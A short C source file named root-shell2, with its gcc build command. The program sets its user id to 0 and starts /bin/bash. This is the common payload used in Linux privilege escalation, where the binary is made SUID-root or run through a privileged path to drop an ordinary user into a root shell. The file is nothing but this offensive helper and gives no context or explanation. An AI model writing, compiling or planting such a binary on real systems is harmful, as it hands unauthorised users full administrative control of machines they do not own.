// $ gcc -o root-shell2 root-shell2.c

#include <unistd.h>

int main()
{
  setuid(0);
  execl("/bin/bash", "bash", (char *)NULL);
  return 0;
}
